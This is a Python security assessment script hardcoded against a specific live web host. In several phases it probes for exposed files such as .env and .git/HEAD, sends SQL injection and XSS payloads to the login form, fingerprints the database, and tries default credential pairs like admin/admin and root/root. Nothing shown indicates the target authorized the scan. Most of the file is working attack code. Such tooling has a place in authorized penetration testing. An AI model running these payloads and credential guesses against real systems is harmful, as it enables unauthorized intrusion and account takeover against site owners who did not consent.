#!/usr/bin/env python3
"""
Security Assessment Script for fresh-start-267.emergent.host
Comprehensive web application security testing
"""

import requests
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import json
import time

class SecurityAssessment:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.findings = []
        
    def log_finding(self, severity, category, description, details=""):
        finding = {
            "severity": severity,
            "category": category,
            "description": description,
            "details": details
        }
        self.findings.append(finding)
        print(f"[{severity}] {category}: {description}")
        if details:
            print(f"    Details: {details}")
    
    def initial_recon(self):
        """Phase 1: Initial reconnaissance"""
        print("\n=== PHASE 1: INITIAL RECONNAISSANCE ===\n")
        
        # Check if site is accessible
        try:
            resp = self.session.get(self.base_url, timeout=10)
            print(f"[+] Site accessible: {resp.status_code}")
            print(f"[+] Server: {resp.headers.get('Server', 'Unknown')}")
            print(f"[+] X-Powered-By: {resp.headers.get('X-Powered-By', 'Not disclosed')}")
            
            # Check for security headers
            security_headers = {
                'X-Frame-Options': resp.headers.get('X-Frame-Options'),
                'X-Content-Type-Options': resp.headers.get('X-Content-Type-Options'),
                'Strict-Transport-Security': resp.headers.get('Strict-Transport-Security'),
                'Content-Security-Policy': resp.headers.get('Content-Security-Policy'),
                'X-XSS-Protection': resp.headers.get('X-XSS-Protection')
            }
            
            print("\n[+] Security Headers:")
            for header, value in security_headers.items():
                if value:
                    print(f"    ✓ {header}: {value}")
                else:
                    print(f"    ✗ {header}: Missing")
                    self.log_finding("LOW", "Missing Security Header", f"{header} not set")
            
            return resp
        except Exception as e:
            print(f"[-] Error accessing site: {e}")
            return None
    
    def check_common_files(self):
        """Check for common files and directories"""
        print("\n=== PHASE 2: COMMON FILES & DIRECTORIES ===\n")
        
        common_paths = [
            '/robots.txt', '/sitemap.xml', '/.git/HEAD', '/.env',
            '/admin', '/login', '/api', '/graphql', '/swagger',
            '/phpinfo.php', '/info.php', '/test.php',
            '/.well-known/security.txt', '/backup', '/config',
            '/database', '/db', '/api/docs', '/api/v1',
            '/wp-admin', '/administrator', '/phpmyadmin'
        ]
        
        for path in common_paths:
            try:
                url = urljoin(self.base_url, path)
                resp = self.session.get(url, timeout=5, allow_redirects=False)
                if resp.status_code in [200, 301, 302, 403]:
                    print(f"[+] Found: {path} ({resp.status_code})")
                    self.log_finding("INFO", "Discovered Endpoint", f"{path} returned {resp.status_code}")
            except:
                pass
    
    def analyze_login_page(self):
        """Analyze login functionality"""
        print("\n=== PHASE 3: LOGIN PAGE ANALYSIS ===\n")
        
        try:
            resp = self.session.get(self.base_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Find forms
            forms = soup.find_all('form')
            print(f"[+] Found {len(forms)} form(s)")
            
            for idx, form in enumerate(forms):
                print(f"\n[+] Form {idx + 1}:")
                action = form.get('action', 'Not specified')
                method = form.get('method', 'GET').upper()
                print(f"    Action: {action}")
                print(f"    Method: {method}")
                
                inputs = form.find_all('input')
                print(f"    Inputs: {len(inputs)}")
                for inp in inputs:
                    print(f"      - {inp.get('name', 'unnamed')}: {inp.get('type', 'text')}")
            
            # Check for comments in HTML
            comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in str(text))
            if comments:
                print(f"\n[+] Found {len(comments)} HTML comment(s)")
                for comment in comments[:5]:
                    print(f"    {str(comment)[:100]}")
            
            # Check for JavaScript files
            scripts = soup.find_all('script', src=True)
            print(f"\n[+] Found {len(scripts)} external script(s)")
            for script in scripts[:10]:
                print(f"    {script.get('src')}")
            
            return soup
        except Exception as e:
            print(f"[-] Error analyzing login page: {e}")
            return None
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print("\n=== PHASE 4: SQL INJECTION TESTING ===\n")
        
        sql_payloads = [
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "admin' --", "admin' #", "' OR 1=1--",
            "1' UNION SELECT NULL--", "' AND '1'='2",
            "1' AND '1'='1", "' OR 'a'='a"
        ]
        
        # Test login form
        login_url = urljoin(self.base_url, '/login')
        
        for payload in sql_payloads[:3]:  # Test first 3
            try:
                data = {
                    'username': payload,
                    'password': payload
                }
                resp = self.session.post(login_url, data=data, timeout=5)
                
                # Check for SQL error messages
                error_patterns = [
                    r'SQL syntax.*MySQL',
                    r'Warning.*mysql_',
                    r'MySQLSyntaxErrorException',
                    r'PostgreSQL.*ERROR',
                    r'SQLite.*error',
                    r'ORA-\d{5}',
                    r'Microsoft SQL Server'
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        self.log_finding("CRITICAL", "SQL Injection", 
                                       f"Possible SQL injection with payload: {payload}",
                                       f"Error pattern matched: {pattern}")
                        print(f"[!] Potential SQLi vulnerability detected!")
                        return True
                        
            except Exception as e:
                print(f"[-] Error testing payload: {e}")
        
        print("[+] No obvious SQL injection vulnerabilities detected")
        return False
    
    def test_xss(self):
        """Test for XSS vulnerabilities"""
        print("\n=== PHASE 5: XSS TESTING ===\n")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        # Test in login form
        for payload in xss_payloads[:2]:
            try:
                data = {'username': payload, 'password': 'test'}
                resp = self.session.post(urljoin(self.base_url, '/login'), data=data, timeout=5)
                
                if payload in resp.text:
                    self.log_finding("HIGH", "XSS", f"Reflected XSS with payload: {payload}")
                    print(f"[!] Potential XSS vulnerability detected!")
            except:
                pass
        
        print("[+] XSS testing completed")
    
    def identify_database(self):
        """Try to identify the database type"""
        print("\n=== PHASE 6: DATABASE IDENTIFICATION ===\n")
        
        # Database-specific error triggers
        db_tests = {
            'MySQL': ["'", "1' AND SLEEP(0)--"],
            'PostgreSQL': ["'", "1' AND pg_sleep(0)--"],
            'SQLite': ["'", "1' AND randomblob(0)--"],
            'MSSQL': ["'", "1' AND WAITFOR DELAY '00:00:00'--"],
            'Oracle': ["'", "1' AND DBMS_LOCK.SLEEP(0)--"]
        }
        
        for db_type, payloads in db_tests.items():
            print(f"[*] Testing for {db_type}...")
            try:
                data = {'username': payloads[0], 'password': 'test'}
                resp = self.session.post(urljoin(self.base_url, '/login'), data=data, timeout=5)
                
                # Check response for DB-specific indicators
                if db_type == 'MySQL' and ('mysql' in resp.text.lower() or 'mariadb' in resp.text.lower()):
                    print(f"[+] Likely using {db_type}")
                    self.log_finding("INFO", "Database Type", f"Identified: {db_type}")
                elif db_type == 'PostgreSQL' and 'postgres' in resp.text.lower():
                    print(f"[+] Likely using {db_type}")
                    self.log_finding("INFO", "Database Type", f"Identified: {db_type}")
                elif db_type == 'SQLite' and 'sqlite' in resp.text.lower():
                    print(f"[+] Likely using {db_type}")
                    self.log_finding("INFO", "Database Type", f"Identified: {db_type}")
            except:
                pass
    
    def test_authentication_bypass(self):
        """Test for authentication bypass"""
        print("\n=== PHASE 7: AUTHENTICATION BYPASS TESTING ===\n")
        
        bypass_attempts = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': 'password'},
            {'username': 'administrator', 'password': 'administrator'},
            {'username': 'root', 'password': 'root'},
            {'username': 'admin', 'password': ''},
            {'username': '', 'password': ''},
        ]
        
        for creds in bypass_attempts:
            try:
                resp = self.session.post(urljoin(self.base_url, '/login'), data=creds, timeout=5)
                if 'dashboard' in resp.text.lower() or 'welcome' in resp.text.lower() or resp.status_code == 302:
                    print(f"[!] Possible bypass with: {creds}")
                    self.log_finding("CRITICAL", "Weak Credentials", f"Login successful with: {creds}")
            except:
                pass
    
    def generate_report(self):
        """Generate final security assessment report"""
        print("\n" + "="*60)
        print("SECURITY ASSESSMENT REPORT")
        print("="*60)
        print(f"\nTarget: {self.base_url}")
        print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\nTotal Findings: {len(self.findings)}")
        
        # Group by severity
        critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high = [f for f in self.findings if f['severity'] == 'HIGH']
        medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
        low = [f for f in self.findings if f['severity'] == 'LOW']
        info = [f for f in self.findings if f['severity'] == 'INFO']
        
        print(f"\nCRITICAL: {len(critical)}")
        print(f"HIGH: {len(high)}")
        print(f"MEDIUM: {len(medium)}")
        print(f"LOW: {len(low)}")
        print(f"INFO: {len(info)}")
        
        print("\n" + "="*60)
        print("DETAILED FINDINGS")
        print("="*60)
        
        for finding in self.findings:
            print(f"\n[{finding['severity']}] {finding['category']}")
            print(f"Description: {finding['description']}")
            if finding['details']:
                print(f"Details: {finding['details']}")
        
        # Save to file
        with open('security_assessment_report.json', 'w') as f:
            json.dump({
                'target': self.base_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'findings': self.findings
            }, f, indent=2)
        
        print(f"\n[+] Report saved to: security_assessment_report.json")
    
    def run_full_assessment(self):
        """Run complete security assessment"""
        print("="*60)
        print("STARTING SECURITY ASSESSMENT")
        print("="*60)
        
        self.initial_recon()
        self.check_common_files()
        self.analyze_login_page()
        self.test_sql_injection()
        self.test_xss()
        self.identify_database()
        self.test_authentication_bypass()
        self.generate_report()

if __name__ == "__main__":
    target = "http://fresh-start-267.emergent.host"
    
    print(f"Target: {target}")
    print("Starting comprehensive security assessment...\n")
    
    assessment = SecurityAssessment(target)
    assessment.run_full_assessment()
